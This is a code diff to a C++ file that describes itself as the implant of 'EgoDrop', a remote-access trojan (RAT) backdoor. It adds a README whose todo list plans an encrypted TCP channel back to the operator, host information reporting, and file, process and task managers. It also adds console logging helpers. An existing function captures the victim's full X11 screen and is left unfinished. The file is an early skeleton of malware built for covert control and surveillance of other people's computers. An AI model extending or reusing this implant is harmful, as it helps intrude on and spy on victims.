@@ -1,3 +1,24 @@
+/*
+///---------------[ README ]---------------\\\
+
+Name: EgoDrop RAT backdoor client(Implant).
+Author: ISSAC
+
+Todo:
+Establish TCP socket connection.
+Establish encrypted TCP channel.
+Send info.
+Test ping.
+FileMgr.
+ProcMgr.
+TaskMgr.
+
+Done:
+
+
+///---------------[ README ]---------------\\\
+*/
+
 ///---------------[ Library ]---------------\\\
 
 #include <iostream>
@@ -19,7 +40,28 @@
 
 using namespace std;
 
-void fnLogError(const string& szMsg);
+#pragma region Logs Tool
+
+void fnLogOK(const string& szMsg)
+{
+    cout << "[+] " << szMsg << endl;
+}
+void fnLogInfo(const string& szMsg)
+{
+    cout << "[*] " << szMsg << endl;
+}
+void fnLogError(const string& szMsg)
+{
+    cerr << "[-] " << szMsg << endl;
+}
+
+#pragma endregion
+#pragma region Debug Tool
+
+
+
+#pragma endregion
+
 
 int main()
 {
@@ -49,11 +91,6 @@ int main()
     return 0;
 }
 
-void fnLogError(const string& szMsg)
-{
-    cerr << "[-] " << szMsg << endl;
-}
-
 void fnScreenshot()
 {
     Display *display = XOpenDisplay(NULL);
@@ -66,5 +103,5 @@ void fnScreenshot()
     Window root = DefaultRootWindow(display);
     XImage *img = XGetImage(display, root, 0, 0, 1920, 1080, AllPlanes, ZPixmap);
 
-    
+
 }
